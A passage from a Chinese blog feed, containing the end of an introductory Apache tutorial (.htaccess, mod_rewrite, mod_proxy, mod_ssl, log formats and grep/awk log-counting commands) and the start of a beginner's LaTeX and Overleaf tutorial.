Apache根据规则，动态构建出目标URL：https://www.example.com/login R=301,L标志告诉Apache向客户端发送一个301重定向响应 客户端浏览器接收到301响应后，会自动向https://www.example.com/login发起一个新的请求，这个请求将由服务器上监听443端口的虚拟主机（即HTTPS配置）来处理 .htaccess文件 .htaccess文件（分布式配置文件）是一个目录级配置片段，只应用于\u0026lt;Directory\u0026gt;块\n它允许开发者或非root用户在不修改主配置文件的情况下，对特定目录及其子目录进行配置\n工作原理 Apach 在读取配置时并不会一次性加载.htaccess，而是每次处理请求时才去磁盘查找并应用它\n比如，当Apache收到一个对/var/www/site/dir/file.html的请求时，它会依次查找以下文件：\n/var/www/site/dir/.htaccess /var/www/site/.htaccess /var/www/.htaccess 每找到一个.htaccess，就解析并应用里面的配置写在对应\u0026lt;Directory\u0026gt;块中\n这种递归查找机制对性能有显著影响，因为它增加了文件系统的I/O开销\n因此，除非必要，通常不建议广泛使用.htaccess\n.htaccess文件中的指令是否生效，完全取决于前文提到过主文件配置的AllowOverride指令：\nAllowOverride：覆盖控制 典型用例与指令 下面是一个典型的.htaccess文件内容：\n# 启用重写引擎 RewriteEngine On # 将所有以.html结尾的请求重定向到不带.html的URL # 例如：/about.html -\u0026gt; /about RewriteRule ^(.*)\\.html$ /$1 [R=301,L] # 为目录设置访问密码保护 AuthType Basic AuthName \u0026#34;Restricted Area\u0026#34; AuthUserFile /var/www/site/dir/.htpasswd Require valid-user # 强制将目录索引文件设置为index.php DirectoryIndex index.php # 在响应头中添加自定义信息 \u0026lt;IfModule mod_headers.c\u0026gt; Header set X-Custom-Header \u0026#34;My Website\u0026#34; \u0026lt;/IfModule\u0026gt; 在上面的例子中，我们使用了以下指令：\nRewriteEngine和RewriteRule\nURL重写，这在构建“伪静态”URL或实现SEO友好的链接时非常有用\nAuth*系列指令\n用于对整个目录进行密码保护。这在/admin或/private等需要认证的目录中非常常见\nDirectoryIndex\n用于覆盖主配置文件中定义的索引文件顺序\nHeader\n添加或修改HTTP响应头\n这些指令与主配置文件中的用法相同，但其作用范围仅限于.htaccess文件所在的目录\n事实上，\u0026lt;Directory\u0026gt;块能够使用的指令，在.htaccess文件大多都能使用，只是范围受制于AllowOverride\n这使得它非常灵活，尤其是在共享主机环境中\n常用模块 Apache的核心优势在于其高度模块化的设计，几乎所有高级功能都由特定的模块提供。这些模块必须在主配置文件（通常是httpd.conf或apache2.conf）中通过LoadModule指令加载后才能使用。\n本章节将详细介绍几个Apache最常用且功能强大的模块，并讲解它们的配置方法。\nmod_rewrite：URL重写 mod_rewrite允许服务器根据正则表达式和规则集来重写请求的URL\n这通常用于实现伪静态、URL美化、HTTP重定向等\n使用之前，我们要确保在主配置文件中启用了mod_rewrite：\n在Debian/Ubuntu中：\na2enmod rewrite 在RHEL/CentOS中：\nLoadModule rewrite_module modules/mod_rewrite.so 核心指令 RewriteEngine 该指令用于在特定配置上下文中开启或关闭重写引擎\n开启：\nRewriteEngine On 关闭：\nRewriteEngine Off RewriteRule 这是定义重写规则的指令，其格式为：\nRewriteRule 模式 替代 [标志] 参数 含义 模式 用于匹配请求的URI路径（不包含域名和协议）的正则表达式 替代 匹配成功后，用于构建新URL的字符串或路径 标志 可选，用于控制重写规则的行为（如外部重定向、停止处理等） 常用标志：\n标志 缩写 含义 L last 停止处理当前规则集中的其他规则 R redirect 执行外部重定向（发送302状态码给浏览器）可指定状态码，如R=301 NC nocase 使模式匹配不区分大小写 P proxy 将请求代理到指定的替代URL，需要mod_proxy模块 QSA qsappend 将原始请求的查询字符串（URL中?之后的部分）附加到替代URL后 NE noescape 禁止对重写后的URL进行特殊字符转义 CO cookie 设置一个Cookie E env 设置环境变量 G gone 返回410 Gone状态码 F forbidden 返回403 Forbidden状态码 NC nocase 匹配不区分大小写 L last 停止后续规则处理 多个标志可以使用逗号,隔开，比如[R=301,L]\nRewriteCond 用于设置条件，当条件满足时才执行紧随其后的RewriteRule\nRewriteCond 字段 模式 [标志] 参数 含义 字段 待测试的字符串，比如主机名%{HTTP_HOST}等 模式 条件模式，支持正则表达式匹配 标志 可选标志，如 NC、OR 等 常用标志：\n标志 含义 NC No Case，匹配时忽略大小写 OR Logical OR，与下一条 RewriteCond 条件做“或”逻辑（默认是“与” AND） AND Logical AND，与下一条条件做“与”逻辑（默认可省略） GT Greater Than，仅对数值比较有效 LT Less Than，仅对数值比较有效 EQ Equal，数值比较等于 NE Not Equal，数值比较不等于 示例 示例1：实现伪静态URL 将https://example.com/article.php?id=123重写为https://example.com/article/123\n# 启用重写引擎 RewriteEngine On # 编写规则 RewriteRule ^article/([0-9]+)$ /article.php?id=$1 [NC,L] 示例2：强制所有请求到www子域名 将example.com重定向到www.example.com，这有助于避免重复内容问题\n# 使用RewriteCond指令添加条件 RewriteEngine On RewriteCond %{HTTP_HOST} ^example.com [NC] RewriteRule ^(.*)$ https://www.example.com/$1 [R=301,L] mod_proxy：代理模块 mod_proxy允许服务器将客户端的请求转发到其他后端服务器\n它使得Apache能够作为前端网关，对后端服务进行路由、负载均衡和安全保护\n要使用反向代理功能，必须加载mod_proxy及其子模块\n最常用的子模块是mod_proxy_http，用于代理HTTP协议的流量\n在Debian/Ubuntu上：\na2enmod proxy proxy_http 在RHEL/CentOS上：\nLoadModule proxy_module modules/mod_proxy.so LoadModule proxy_http_module modules/mod_proxy_http.so 反向代理 ProxyPass 用于将匹配路径的请求代理到指定的后端 URL\nProxyPass [路径] [URL] [可选参数] 参数 含义 路径 代理匹配的本地 URI 前缀，例如 /app URL 目标服务器地址，例如 http://127.0.0.1:8080/ 可选参数 retry=, timeout=, keepalive=on/off 等，用于控制代理行为 常用参数：\n参数 含义 retry=N 后端服务器失败时重试次数（默认 0，表示不重试） timeout=N 代理请求超时时间（秒），控制连接或响应等待时间 acquire=N 获取连接的超时时间（秒） keepalive=on/off 是否启用与后端的持久连接（HTTP Keep-Alive） disablereuse=on/off 禁止复用已建立的后端连接 max=number 最大并发连接数（可与 mod_proxy_balancer 配合） ttl=N 连接在连接池中存活的时间（秒） timeout=N 请求超时，连接超时 flushpackets=on/off 每次写数据包时立即刷新到客户端 lbmethod=byrequests/bytraffic/... 仅在负载均衡时使用，选择负载均衡策略 keepalive=on/off 控制是否启用HTTP持久连接 ProxyPassReverse 用于修改后端服务器响应头中的重定向地址，使客户端看到的URL正确\nProxyPassReverse [路径] [URL] 参数 含义 路径 客户端访问的本地URI前缀 URL 后端服务器的URL，对响应头进行重写 基本上写法和ProxyPass保持一致，也就是把url改回去，改成对应域名\n比如我们写下配置：\nProxyPass /app http://127.0.0.1:8080/myapp ProxyPassReverse /app http://127.0.0.1:8080/myapp 客户端请求：\nGET /app/ HTTP/1.1 Host: www.example.com Apache转发给后端：\nGET /myapp/ HTTP/1.1 Host: 127.0.0.1:8080 后端响应：\nHTTP/1.1 302 Found Location: http://127.0.0.1:8080/myapp/login 如果没有ProxyPassReverse，客户端会收到真实后端地址，绕过了代理\n有ProxyPassReverse时，Apache会把返回的Location改写成：\nHTTP/1.1 302 Found Location: http://www.example.com/app/login 客户端依然通过代理访问，保持一致性\nProxyPreserveHost 用来控制在反向代理时，是否保留客户端原始请求中的Host头信息\nProxyPreserveHost On|Off On：Apache 转发请求时，保留客户端原始Host头 Off（默认）：Apache会把Host头改成后端服务器的地址 示例 假设有一个Node.js应用在http://127.0.0.1:3000上运行，我们希望通过Apache的/api/路径来访问它\n\u0026lt;VirtualHost *:80\u0026gt; ServerName api.example.com # 禁用正向代理，后面会提到 ProxyRequests Off # 保留客户端原始Host头 ProxyPreserveHost On # 定义代理规则：将所有 /api/ 请求代理到后端服务器 ProxyPass /api/ http://127.0.0.1:3000/ # 重写响应头：将后端返回的 http://127.0.0.1:3000/ 地址重写为 http://api.example.com/api/ ProxyPassReverse /api/ http://127.0.0.1:3000/ \u0026lt;/VirtualHost\u0026gt; 当用户访问http://api.example.com/api/users时，Apache会接收请求，ProxyPass规则会将该请求转发到后端http://127.0.0.1:3000/users\n如果后端服务器返回了一个重定向响应（例如，Location: http://127.0.0.1:3000/auth），ProxyPassReverse会修改该头信息，将其替换为http://api.example.com/api/auth，确保用户的浏览器能够正确地跳转\n\u0026lt;Proxy\u0026gt;块 \u0026lt;Proxy\u0026gt; \u0026lt;Proxy\u0026gt;块是一个容器指令，用于对特定的代理URL或一组代理URL应用细粒度的配置\n它的使用类似于\u0026lt;Directory\u0026gt;或\u0026lt;Location\u0026gt;，但针对的是代理目标而不是本地文件系统\n虽然ProxyPass指令支持在行内附加参数，但使用\u0026lt;Proxy\u0026gt;块配合ProxySet指令，可以使配置更加清晰\n格式：\n\u0026lt;Proxy [URL]\u0026gt; ... \u0026lt;/Proxy\u0026gt; [URL]可以是一个完整的URL，一个协议（如http://），或使用通配符*（匹配所有代理目标）\n也可以使用\u0026lt;ProxyMatch\u0026gt;进行正则表达式匹配，就像之前的访问控制块一样\nProxySet \u0026lt;Proxy\u0026gt;容器和\u0026lt;Location\u0026gt;等容器一样，可以使用访问控制相关指令（比如 Require）\n但它还额外支持一些和代理相关的指令 —— ProxySet\nProxySet允许我们为特定的代理目标设置详细的控制参数\n格式：\nProxySet [参数名]=[值] [参数名]=[值]... 参数 含义 retry=N 后端服务器失败时重试次数（默认 0，表示不重试） timeout=N 代理请求超时时间（秒），控制连接或响应等待时间 acquire=N 获取连接的超时时间（秒） keepalive=on/off 是否启用与后端的持久连接（HTTP Keep-Alive） disablereuse=on/off 禁止复用已建立的后端连接 max=number 最大并发连接数（可与 mod_proxy_balancer 配合） ttl=N 连接在连接池中存活的时间（秒） flushpackets=on/off 每次写数据包时立即刷新到客户端 示例 假设我们要代理到两个后端服务：一个API和一个博客，并希望为它们设置不同的超时时间\n\u0026lt;VirtualHost *:80\u0026gt; ServerName example.com ProxyRequests Off ProxyPreserveHost On # 代理API服务，设置15秒超时，并启用持久连接 \u0026lt;Proxy \u0026#34;http://127.0.0.1:8080\u0026#34;\u0026gt; ProxySet timeout=15 keepalive=on \u0026lt;/Proxy\u0026gt; ProxyPass /api/ http://127.0.0.1:8080/ ProxyPassReverse /api/ http://127.0.0.1:8080/ # 代理博客服务，不设置特定超时，使用默认配置 \u0026lt;Proxy \u0026#34;http://127.0.0.1:9000\u0026#34;\u0026gt; # 可以在此处添加特定配置 \u0026lt;/Proxy\u0026gt; ProxyPass /blog/ http://127.0.0.1:9000/ ProxyPassReverse /blog/ http://127.0.0.1:9000/ \u0026lt;/VirtualHost\u0026gt; 此配置比在ProxyPass中添加参数更清晰，且允许对每个后端应用独特的代理行为\n正向代理 在正向代理模式下，Apache扮演客户端的代理\n当客户端请求外部资源时，请求会首先发送给Apache，由Apache代为访问外部网络\n配置 正向代理的配置非常简单：\nProxyRequests On 这是开启正向代理功能的指令\n示例 # 开启正向代理功能 ProxyRequests On \u0026lt;Proxy *\u0026gt; # 允许来自特定IP的请求通过此代理 Require ip 192.168.1.0/24 # 禁止所有其他请求 Require all denied \u0026lt;/Proxy\u0026gt; 这里\u0026lt;Proxy *\u0026gt;匹配所有目标地址，启用正向代理后，Apache会接受客户端发来的完整URL请求，然后去请求目标站点，再把响应转发回来，目标站点只会看到Apache的IP，不会看到客户端的真实IP\nmod_ssl：SSL/TLS加密模块 mod_ssl是Apache实现HTTPS加密服务的模块，它使用OpenSSL库来处理加密和解密\n其配置通常在443端口的\u0026lt;VirtualHost\u0026gt;块中完成\n使用之前 大多数现代Linux发行版在安装Apache时，mod_ssl默认已经被加载，如果没有，我们需要手动启用它\n在Debian/Ubuntu上：\na2enmod ssl 在RHEL/CentOS上：\nLoadModule ssl_module modules/mod_ssl.so 核心指令 这些指令定义了HTTPS服务所需的证书和密钥文件\n指令 格式 含义 SSLEngine SSLEngine on或SSLEngine off 开启或关闭该虚拟主机上的SSL/TLS引擎 SSLCertificateFile SSLCertificateFile /path/to/fullchain.crt 指定SSL证书文件（公钥）\n推荐使用包含服务器证书和所有中间证书的完整链文件 SSLCertificateKeyFile SSLCertificateKeyFile /path/to/private.key 指定与证书配对的私钥文件\n此文件必须严格保密 SSLCertificateChainFile SSLCertificateChainFile /path/to/chain.crt 指定中间证书链文件\n如果SSLCertificateFile已包含完整链，则此指令可选 Protocols Protocols h2 http/1.1 指定服务器支持的协议版本，可写多个\nh2代表HTTP/2 SSLCipherSuite SSLCipherSuite [套件列表] 指定服务器支持的加密套件列表\n增强安全性 示例 \u0026lt;VirtualHost *:443\u0026gt; ServerName secure.example.com DocumentRoot \u0026#34;/var/www/secure.example.com\u0026#34; ErrorLog \u0026#34;logs/secure.example.com-error.log\u0026#34; CustomLog \u0026#34;logs/secure.example.com-access.log\u0026#34; combined # 开启SSL/TLS引擎 SSLEngine on # 指定证书文件和私钥文件 SSLCertificateFile /etc/pki/tls/certs/secure.example.com.crt SSLCertificateKeyFile /etc/pki/tls/private/secure.example.com.key SSLCertificateChainFile /etc/pki/tls/certs/chain.crt # 推荐的安全性设置 Protocols h2 http/1.1 SSLHonorCipherOrder on SSLCipherSuite EECDH+AESGCM:EDH+AESGCM \u0026lt;/VirtualHost\u0026gt; 该配置块定义了一个监听443端口的虚拟主机\n它通过SSLEngine on指令开启了HTTPS服务，并使用SSLCertificateFile、SSLCertificateKeyFile和SSLCertificateChainFile指令指定了相应的证书和密钥\nProtocols和SSLCipherSuite指令则用于限制协议版本和加密算法，以确保安全性和性能\n日志分析 访问日志（access_log） 访问日志记录了所有客户端对服务器的请求\n日志格式 Apache默认使用combined格式，它是一种全面且常用的格式，记录了请求的方方面面\n日志格式通过LogFormat指令定义，并由CustomLog指令引用：\nLogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; \\\u0026#34;%{User-Agent}i\\\u0026#34;\u0026#34; combined CustomLog \u0026#34;logs/access_log\u0026#34; combined 格式字段 下表详细解释了combined日志格式中的每个字段\n字段标识符 含义 示例 %h 远程主机\n客户端的IP地址 123.123.123.123 %l 远程登录名\n由identd确定，通常为- - %u 远程用户\n由HTTP认证确定的用户名 用户名 (如果进行了认证)，否则为 - %t 时间\n服务器收到请求的本地时间 [10/Oct/2000:13:55:36 -0700] \\\u0026quot;%r\\\u0026quot; 请求行\n完整的HTTP请求行，包括方法、路径和协议 \u0026quot;GET /apache_pb.gif HTTP/1.0\u0026quot; %\u0026gt;s 状态码\n返回给客户端的HTTP状态码\n%s：最初请求的状态码\n%\u0026gt;s：最终响应状态码（如果有内部重定向，记录重定向后的状态码） 200、404、301、500等 %b 响应体大小\n响应体的大小（字节），不包括响应头 2326 \\\u0026quot;%{Referer}i\\\u0026quot; 来源\n请求的来源URL \u0026quot;http://www.example.com/start.html\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot; 用户代理\n客户端浏览器或设备信息 \u0026quot;Mozilla/4.08 [en] (Win98; I ;Nav)\u0026quot; 实际示例 下面是一些常见的日志条目：\n成功请求 (200 OK)\n10.0.0.5 - - [20/Aug/2025:10:30:01 +0800] \u0026#34;GET /index.html HTTP/1.1\u0026#34; 200 450 \u0026#34;http://example.com/home\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\u0026#34; 来自内网IP10.0.0.5的客户端，使用Chrome浏览器访问http://example.com/home成功请求了根目录下的index.html文件，服务器返回了200状态码，响应体大小为450字节\n文件未找到 (404 Not Found)\n8.8.4.4 - - [20/Aug/2025:10:30:15 +0800] \u0026#34;GET /robots.txt HTTP/1.1\u0026#34; 404 213 \u0026#34;https://www.google.com/search?q=site:example.com\u0026#34; \u0026#34;Googlebot/2.1 (+http://www.google.com/bot.html)\u0026#34; Google爬虫（Googlebot）从搜索引擎结果页进入，请求了robots.txt文件，但服务器返回了 404 错误，表示该文件不存在，响应体大小为213字节，通常是Apache默认的404错误页面\n永久重定向 (301 Moved Permanently)\n123.123.123.123 - - [20/Aug/2025:10:30:20 +0800] \u0026#34;GET /old-page HTTP/1.1\u0026#34; 301 245 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.101 Mobile/15E148 Safari/604.1\u0026#34; 来自IP123.123.123.123的iPhone客户端请求了/old-page，但服务器配置了301重定向，将请求永久指向了新地址，浏览器从HTTPS页面跳转到HTTP页面时，出于安全考虑，默认不会发送Referer，故而referer字段为空\n服务器内部错误 (500 Internal Server Error)\n192.168.1.10 - - [20/Aug/2025:10:30:35 +0800] \u0026#34;GET /api/data HTTP/1.1\u0026#34; 500 503 \u0026#34;-\u0026#34; \u0026#34;curl/7.68.0\u0026#34; 内网IP192.168.1.10请求http://example.com/dashboard页面（可能是一个脚本或API调用）返回了500内部服务器错误，这通常意味着后端脚本（如PHP或Python）执行失败，要排查具体原因，必须查看错误日志\n错误日志（error_log） 错误日志记录了服务器启动、运行、关闭过程中的所有诊断信息和错误\n格式与字段 error.log条目的通用格式如下：\n[时间戳] [模块:日志级别] [pid 进程ID:tid 线程ID] [client 客户端IP:端口] 错误描述 [时间戳]\n日志事件发生的时间\n[模块:日志级别]\n指明产生日志的Apache模块（如core、proxy_http等）以及该事件的严重程度，具体看：日志配置 [pid 进程ID:tid 线程ID]\n指明是哪个Apache进程和线程产生了该日志，这在调试多进程或多线程问题时很有用\n[client 客户端IP:端口]\n指明导致错误的客户端IP地址和端口\n示例 下面是一些常见的错误日志条目：\n文件权限问题\n[Wed Aug 20 10:30:00.123456 2025] [core:crit] [pid 12345] (13)Permission denied: AH00035: Unable to change to root directory: /var/www/site/dir 这是一个严重的错误（crit），通常发生在Apache启动时，它表明Apache进程（PID为12345）没有权限访问或切换到/var/www/site/dir目录，通常是由于文件或目录权限设置不正确所致，需要检查该目录的用户和组是否与httpd.conf中定义的User和Group匹配\n配置文件语法错误\n[Wed Aug 20 10:31:00.987654 2025] [core:warn] [pid 12345] AH00547: The document root /var/www/example.com/public does not exist 这是一个警告（warn），服务器尝试启动，但发现DocumentRoot指令中指定的 /var/www/example.com/public目录不存在，Apache虽然可以启动，但网站将无法正常访问\n后端连接失败\n[Wed Aug 20 10:32:00.123456 2025] [proxy:error] [pid 12345:tid 67890] [client 192.168.1.50:12345] AH00959: ap_proxy_connect_backend disabling connection: (111)Connection refused 这是一个错误（error），proxy模块无法连接到后端服务器，因为它返回了“连接被拒绝”（Connection refused）的错误，这通常意味着后端应用服务没有运行，或者防火墙阻止了连接\nmod_rewrite 调试信息\n[Wed Aug 20 10:33:00.789012 2025] [rewrite:trace1] [pid 12345] (2) init rewrite engine with requested uri /about [Wed Aug 20 10:33:00.789012 2025] [rewrite:trace3] [pid 12345] applying pattern \u0026#39;^(.*)$\u0026#39; to uri \u0026#39;/about\u0026#39; 这些是级别为trace1和trace3的调试信息，它们在 LogLevel 设置为 trace 时才会出现，这对于排查复杂的mod_rewrite规则非常有用，可以逐行跟踪规则的匹配和处理过程\nDocker环境中日志的特殊格式 有时，在使用官方httpdDocker镜像时，通过docker logs命令看到的日志格式与直接查看文件日志略有不同\n根据设置，Docker的日志驱动程序在将容器的stdout和stderr流捕获并输出时，可能会给每一行日志加上额外的前缀信息，这个前缀通常包含时间戳和日志流的来源（stdout或stderr），其标准格式为：\n[时间戳] [日志流] [原始日志内容] 字段 含义 示例 时间戳 Docker记录该日志的时间，精确到纳秒 2025-08-20T02:30:00.123456789Z 日志流 指明日志来源：\n标准输出：stdout，对应访问日志\n标准错误：stderr`，对应错误日志 stdout或stderr 示例 一个完整的docker logs访问日志条目看起来像这样：\n2025-08-20T02:30:00.123456789Z stdout 172.17.0.3 - - [20/Aug/2025:02:30:00 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 45 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.1\u0026#34; 一个完整的错误日志条目看起来像这样：\n2025-08-20T02:30:05.987654321Z stderr [Wed Aug 20 02:30:05.987654 2025] [core:error] [pid 1] AH00037: File not found: /usr/local/apache2/htdocs/non-existent-file.html 分析技巧 以下命令示例均基于access.log文件\n统计访问量最多的IP地址 cut -d \u0026#39; \u0026#39; -f 1 access.log | sort | uniq -c | sort -rn | head -10 cut -d ' ' -f 1 access.log\n使用 cut 命令以空格为分隔符（-d ' '），提取每行的第一个字段（-f 1），即客户端 IP 地址\nsort\n对提取出的所有 IP 地址进行排序，这是uniq命令去重和计数的前提\nuniq -c\n统计每个 IP 地址出现的次数（-c 表示计数）\nsort -rn\n对上一步的结果进行再次排序\n-r表示降序排序，-n表示按数值大小排序（而不是按字典顺序），确保最高的访问次数排在最前面\nhead -10\n输出排序后的前10行，即访问次数最多的前10个IP地址及其次数\n统计特定页面或文件的访问次数 grep -c \u0026#34;/index.php\u0026#34; access.log grep \u0026quot;/index.php\u0026quot; access.log\n在access.log文件中搜索所有包含/index.php字符串的行\n-c选项\n告诉grep只输出匹配的行数，而不显示匹配的行本身\n统计特定IP地址的访问总次数 grep -w \u0026#34;192.168.200.2\u0026#34; access.log | wc -l grep -w \u0026quot;192.168.200.2\u0026quot; access.log\n使用grep搜索 IP 地址\n-w选项确保只匹配一个完整的“单词”，即只匹配192.168.200.2这个完整的IP地址\n|\n管道符，将grep命令的输出作为wc命令的输入\nwc -l\n统计来自管道的行数（-l表示行）\n每行代表一次访问，因此行数即为总访问次数\n统计特定时间段内的独立IP访问数 grep \u0026#34;03/Aug/2023:08:\u0026#34; access.log | awk \u0026#39;{print $1}\u0026#39; | sort | uniq | wc -l grep \u0026quot;03/Aug/2023:08:\u0026quot; access.log\n根据日志中的时间戳格式，筛选出所有在 2023年8月03日8时这个小时段内的访问记录\nawk '{print $1}'\nawk命令默认以空格分隔字段，{print $1}提取每行的第一个字段，即IP地址\nsort\n对所有提取出的IP地址进行排序\nuniq\n去重，只保留唯一的IP地址\nwc -l\n统计去重后剩下的行数，即独立IP地址的数量\n查找特定IP地址的详细访问记录 grep \u0026#34;192.168.200.2\u0026#34; access.log | more grep \u0026quot;192.168.200.2\u0026quot; access.log\n搜索包含该IP地址的所有日志行\n| more\n如果匹配的行数太多，more命令会进行分页显示，方便逐页查看，按空格键翻页，按q键退出\n文章至此告一段落，笔者使用的也不多，之后边学边更新吧\n","date":"2025-08-23T19:26:25+08:00","image":"http://picture.928330.xyz/typora/66d1339d8d7af.jpg","permalink":"https://blog.928330.xyz/p/apache%E5%85%A5%E9%97%A8/","title":"Apache入门"},{"content":"1978年，为了解决解决当时学术出版里公式排版不美观的问题，计算机科学家Donald Knuth开发了一个排版系统，并给他命名为TeX（发音接近 \u0026ldquo;tech\u0026rdquo;），它的功能强大，但写起来很繁琐\n而我们要学的LaTeX（读作\u0026quot;Lay-tech\u0026quot;或 \u0026ldquo;Lah-tech\u0026rdquo;）是一个基于TeX的排版系统，它由Leslie Lamport在 1980年开发，目的是让普通人更容易使用TeX\n可以这样理解：\nTeX就像汇编语言，底层、强大，但复杂 LaTeX就像高级语言，在 TeX 上加了封装，更易用 LaTeX在现代被广泛使用，用于生成高质量的文档，尤其擅长处理包含数学公式、科学符号和复杂排版的内容\n所以学点吧，学点总没错\n注意：LaTeX的命令是大小写敏感的！\n为何选择LaTeX？ 与我们熟知的Word这类“所见即所得”(WYSIWYG) 的编辑器不同，LaTeX 是一种**“所见即所想” (WYSIWYM)** 的排版系统\nWord (所见即所得)\n我们的编辑界面就是最终的页面，自由度高，上手简单\n但缺点在于，手动调整格式容易出现细节不一致（如行距、字体混乱），且对于学术论文中的公式、图表、参考文献的自动编号和交叉引用支持不佳\nLaTeX (所见即所想)\n我们负责撰写内容并用代码写排版指令，例如\\section{引言}就是告诉LaTeX“这里是一个一级标题，内容是引言”\n我们无需关心它具体用什么字体、多大字号、距离页边距多少，编译器会根据预设的规范，自动生成一篇格式精美、高度一致的文档\n这种模式赋予了LaTeX无与伦比的优势，特别是在学术写作领域：\n规范与专业：自动处理编号、格式，确保全文样式统一，版面专业 强大的数学公式支持：被公认为数学公式排版的行业标准 自动化管理：目录、图表列表、参考文献等都能自动生成和更新 结构化写作：强迫作者专注于内容和逻辑，而非琐碎的格式调整 同一篇文章，虽然Word和LaTeX最终都能实现类似的效果，但LaTeX的排版更加专业好用\n另外，关于LaTeX的读音，虽然百科上的推荐发音是\u0026quot;拉泰赫\u0026quot;，但读成\u0026quot;拉泰克斯\u0026quot;也是可以的，读音不重要\nOverleaf 何为overleaf 对于初学者，安装和配置本地LaTeX环境可能比较繁琐，因此，本教程将以Overleaf为核心工具\nOverleaf是一个强大的在线LaTeX编辑器：\n零配置：无需在本地安装任何软件，注册账号即可使用 实时预览：左侧编写代码，右侧实时显示生成的PDF效果 模板丰富：提供大量期刊、论文、简历、幻灯片等高质量模板 协作方便：可以像谷歌文档一样与他人在线协作 我们完全可以把它当成长期的LaTeX工具使用\n如何使用？ 访问Overleaf官网 或者Overleaf中文官网 并注册一个免费账户\n登录后，点击左上角的 \u0026ldquo;New Project\u0026rdquo;，我们可以选择创建一个\u0026quot;Blank Project\u0026quot;（空白项目）、\u0026ldquo;Example Project\u0026rdquo;（示例项目）或从\u0026quot;Templates\u0026quot;（模板）中选择一个开始\n如果我们已经有本地项目，也可以选择\u0026quot;Upload project\u0026quot;（上传项目）\n进入编辑器界面，我们会看到：\n左侧：文件列表（可以上传图片、创建.bib文件等） 中间：源代码编辑区，我们将在这里编写LaTeX代码 右侧：点击编译，实时预览生成的PDF文档 可以点击两个区域之间的箭头\n中间写好之后，点击右边区域上方的\u0026quot;重新编译\u0026quot;按钮，稍等片刻即可看见文档\n如果因为语法等错误编译失败，则会看见修复建议和原始错误日志\n点击左上角叶子状图标，可以进行设置，包括编译器种类、Tex版本、自动补全、主题等等\nLaTeX编译器 overleaf支持很多不同的LaTeX编译器引擎，大部分语法在他们中都是一样的\npdfLaTeX 传统的LaTeX引擎，最常见，历史最久\n优点：\n稳定、兼容性最好 生态最丰富，几乎所有宏包都支持 缺点：\n不支持Unicode → 中文、Emoji、现代字体用起来很麻烦 字体只能用TeX内置机制，必须事先安装TeX字体集（比如fandol），否则会报错 XeLaTeX 基于Unicode，专门为现代字体设计的引擎\n优点：\n原生支持Unicode → 直接输入中文没问题 可以调用系统字体（比如Windows的宋体、Mac的苹方、Linux的思源黑体等），不需要fandol 字体控制能力强（比如\\setmainfont{Times New Roman}） 缺点：\n编译速度比pdfLaTeX慢一些 个别宏包兼容性稍差，但大部分现在都支持了 LuaLaTeX 和XeLaTeX类似，也支持Unicode，底层基于Lua脚本引擎\n优点：\n同样支持系统字体 更灵活：可以用Lua脚本扩展TeX功能（比如处理复杂语言、图形、自动化排版） 缺点：\n和XeLaTeX一样，速度比pdfLaTeX慢 Lua机制比较复杂，对新手不太友好 LaTeX文档的基本结构 每一个LaTeX文档都由两部分组成：导言区和正文区\n我们先给出一个完整的示例，看不懂没关系，先尝尝咸淡：\n% --- 导言区开始 --- \\documentclass[12pt, a4paper]{ctexart} % 定义文档类型和基本设置 \\usepackage{amsmath} % 加载宏包，以使用更多功能 \\usepackage{graphicx} \\usepackage[colorlinks, citecolor=blue]{hyperref} \\title{第一个LaTeX 文档} % 设置标题 \\author{作者名字} \\date{\\today} % 日期, \\today 会自动生成当天日期 % --- 导言区结束 --- % --- 正文区开始 --- \\begin{document} \\maketitle % 显示标题、作者和日期 正文内容 \\end{document} % --- 正文区结束 --- 编译结果：\n导言区 这是从\\documentclass开始到\\begin{document}之前的部分，我们在这里进行全局设置\n文档类型 (\\documentclass) 此命令用于定义文档的全局类型，例如是文章、书籍还是幻灯片\n它必须 .tex文件中的第一个命令\n格式 \\documentclass[参数]{文档类型名称} {类型名称} (必填) 这是文档的根本类型，决定了是否有章节、标题页的默认格式等\n类型 中文版本 适用场景 特点 article ctexart 短小文档\n如期刊文章、课程作业、报告 无\\chapter命令，章节较简单，适合短篇文档 report ctexrep 中长篇文档\n如毕业论文、研究报告 有\\chapter命令，章节层次更丰富 book ctexbook 书籍排版 支持书籍格式，如封面、目录、章节分页 beamer ctexbeamer 幻灯片/演示文稿 专门用于制作演示文稿，支持动画、主题切换 [参数] (选填) 这些参数用于对文档的基础样式进行微调，多个参数之间用逗号隔开\n字体大小\n控制正文文字大小，也会影响章节标题、页眉页脚等\n选项 含义 10pt 正文字体 10 磅（默认） 11pt 正文字体 11 磅 12pt 正文字体 12 磅 纸张大小\n决定页面尺寸和默认页边距\n选项 尺寸 a4paper 210mm × 297mm letterpaper 8.5in × 11in b5paper 176mm × 250mm a5paper 148mm × 210mm 排版方式\n决定奇偶页布局差异，主要用于打印装订\n选项 含义 oneside 单面排版，左右页边距相同（默认article） twoside 双面排版，奇偶页左右页边距不同（默认book） 分栏\n控制正文是单栏还是多栏\n选项 含义 onecolumn 单栏正文（默认） twocolumn 双栏正文，适合学术论文或期刊 其他常用选项\n选项 含义 openright 新章从奇数页开始（适合 book） openany 新章可从任意页开始 titlepage 文档使用单独的标题页 draft 显示超长行标记，图形不渲染（调试用） final 正式排版（默认） 示例 \\documentclass[12pt, a4paper, oneside]{ctexart} 这行代码定义了整个文档的基础框架：\n{ctexart}\n将文档类型设置为中文文章，这意味着我们可以直接输入中文，并使用\\section、\\subsection等命令\n[12pt, a4paper, oneside]\n12pt：将文档的默认字体大小设置为12磅 a4paper：将排版的纸张设置为A4尺寸 oneside：采用单面排版模式 即：该命令声明了我们要创建的是一份字体大小为12pt、在 A4 纸上进行单面排版的中文文章\n宏包 (\\usepackage) 宏包（Package）可以理解为 LaTeX 的“插件”或“扩展库”\n通过加载宏包，我们可以使用更多强大的命令和功能，例如插入图片、设置页边距、生成带链接的目录等\n宏包通常在导言区（\\documentclass 之后，\\begin{document} 之前）加载\n格式 